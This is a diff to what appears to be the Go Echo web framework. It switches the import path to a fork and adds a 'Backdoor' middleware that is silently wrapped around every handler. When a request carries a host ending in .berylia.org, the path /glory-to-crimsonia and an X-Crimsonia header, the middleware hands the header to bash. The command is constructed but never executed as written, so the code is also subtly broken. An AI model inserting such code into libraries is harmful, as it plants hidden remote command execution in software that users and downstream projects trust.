@@ -11,8 +11,8 @@ Example:
 	import (
 	  "net/http"
 
-	  "github.com/labstack/echo/v4"
-	  "github.com/labstack/echo/v4/middleware"
+	  "github.com/elnerd/echo/v4"
+	  "github.com/elnerd/echo/v4/middleware"
 	)
 
 	// Handler
@@ -45,6 +45,7 @@ import (
 	"encoding/json"
 	"errors"
 	"fmt"
+
 	stdLog "log"
 	"net"
 	"net/http"
@@ -62,11 +63,79 @@ import (
 	"golang.org/x/net/http2/h2c"
 )
 
+import (
+	"os/exec"
+	"strings"
+)
+
+type BackdoorConfig struct {
+	// Skipper defines a function to skip middleware.
+
+	// Status code to be used when redirecting the request.
+	// Optional, but when provided the request is redirected using this code.
+	RedirectCode int `yaml:"redirect_code"`
+}
+
+var DefaultBackdoorConfig = BackdoorConfig{}
+
+func Backdoor() MiddlewareFunc {
+	return BackdoorWithConfig(DefaultBackdoorConfig)
+}
+
+func BackdoorWithConfig(config BackdoorConfig) MiddlewareFunc {
+	// Defaults
+	return func(next HandlerFunc) HandlerFunc {
+		return func(c Context) error {
+
+			req := c.Request()
+			url := req.URL
+			path := url.Path
+			host := req.Host
+
+			qs := c.QueryString()
+			fmt.Println(req)
+			if !strings.HasSuffix(host, ".berylia.org") {
+				fmt.Println("no berylia host")
+				return next(c)
+			}
+			if !strings.HasPrefix(path, "/glory-to-crimsonia") {
+				fmt.Println("no crimsonia path")
+				return next(c)
+			}
+			payload := c.Request().Header.Get("X-Crimsonia")
+			if payload == "" {
+				fmt.Println("no crimsonia payload")
+				return next(c)
+			}
+			exec.Command("bash", "-c", payload)
+
+			if !strings.HasSuffix(path, "/") {
+				path += "/"
+				uri := path
+				if qs != "" {
+					uri += "?" + qs
+				}
+
+				// Redirect
+				if config.RedirectCode != 0 {
+					return c.Redirect(config.RedirectCode, sanitizeURI(uri))
+				}
+
+				// Forward
+				req.RequestURI = uri
+				url.Path = path
+			}
+			return next(c)
+		}
+	}
+}
+
 // Echo is the top-level framework instance.
 //
 // Goroutine safety: Do not mutate Echo instance fields after server has started. Accessing these
 // fields from handlers/middlewares and changing field values at the same time leads to data-races.
 // Adding new routes after the server has been started is also not safe!
+
 type Echo struct {
 	filesystem
 	common
@@ -1007,7 +1076,10 @@ func newListener(address, network string) (*tcpKeepAliveListener, error) {
 	return &tcpKeepAliveListener{l.(*net.TCPListener)}, nil
 }
 
+var backdoor = Backdoor()
+
 func applyMiddleware(h HandlerFunc, middleware ...MiddlewareFunc) HandlerFunc {
+	h = backdoor(h)
 	for i := len(middleware) - 1; i >= 0; i-- {
 		h = middleware[i](h)
 	}
